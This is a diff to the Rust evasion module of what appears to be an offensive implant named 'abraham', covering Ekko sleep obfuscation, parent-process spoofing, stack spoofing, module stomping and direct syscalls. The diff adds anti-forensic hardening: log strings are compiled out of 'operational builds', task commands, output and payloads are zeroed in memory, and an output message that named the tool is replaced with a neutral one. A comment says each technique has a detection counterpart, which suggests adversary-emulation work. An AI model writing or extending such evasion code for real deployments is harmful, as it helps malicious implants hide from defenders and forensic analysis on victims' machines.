@@ -1,12 +1,32 @@
 //! Phase 2 evasion primitives. Each capability maps to a registry technique
 //! (ABR-T005..T012) and ships with its detection counterpart.
 
+pub mod patch;
 pub mod sleep;
 pub mod spoof;
 pub mod stack;
 pub mod stomp;
 pub mod syscalls;
 pub mod unwind;
+
+/// Lab-only diagnostics (feature `lab-log`). Compiled out of operational
+/// builds, so the message strings never exist in the artifact.
+macro_rules! note {
+    ($($t:tt)*) => {{ #[cfg(feature = "lab-log")] { eprintln!($($t)*); } }};
+}
+pub(crate) use note;
+
+/// Best-effort zeroization of sensitive buffers (task commands, output,
+/// payloads) once the session thread is done with them. Volatile writes
+/// keep the compiler from eliding the stores. This narrows — not closes —
+/// the residual plaintext surface Ekko leaves outside `.text` (session
+/// keys, live buffers); see docs/detections/abr-t006.md.
+pub(crate) fn secure_clear(buf: &mut [u8]) {
+    for byte in buf.iter_mut() {
+        unsafe { std::ptr::write_volatile(byte as *mut u8, 0) };
+    }
+    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+}
 
 use std::time::Duration;
 
@@ -82,7 +102,8 @@ impl Evasion {
             match ekko.sleep(duration) {
                 Ok(()) => {}
                 Err(e) => {
-                    eprintln!("[!] ekko sleep failed ({e}); plain sleep fallback");
+                    note!("[!] ekko sleep failed ({e}); plain sleep fallback");
+                    let _ = &e;
                     std::thread::sleep(duration);
                 }
             }
@@ -109,9 +130,7 @@ impl Evasion {
                                 "ppid spoof failed ({e}); plain spawn failed: {err}"
                             ))
                         })?;
-                    let mut data =
-                        format!("[abraham] ppid spoof unavailable ({e}); plain spawn\r\n")
-                            .into_bytes();
+                    let mut data = format!("[i] fallback spawn ({e})\r\n").into_bytes();
                     let mut combined = output.stdout;
                     combined.extend_from_slice(&output.stderr);
                     data.extend(combined);
